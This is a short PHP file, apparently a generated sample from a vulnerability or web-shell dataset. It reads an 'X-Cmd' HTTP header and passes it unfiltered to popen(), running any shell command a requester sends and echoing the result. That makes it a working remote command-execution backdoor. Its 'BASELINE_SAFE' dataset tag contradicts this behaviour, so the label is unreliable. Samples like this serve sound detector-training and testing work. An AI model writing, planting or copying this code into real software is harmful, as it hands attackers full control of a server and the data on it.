<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_CHANGEKEYCASE; SKELETON=S0; KEY=cmd; SINK=B6; VAR=v0221; HDR_NAME=X-Cmd */
function SINK_B6($command){
    $handle = popen($command, "r");
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            echo $output;
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$h2 = array_change_key_case($h, CASE_LOWER);
$inp = (string)($h2["x-cmd"] ?? "");
$inp = (string)$inp; // no value processing
$out = SINK_B6($inp);
echo (string)($out);
?>
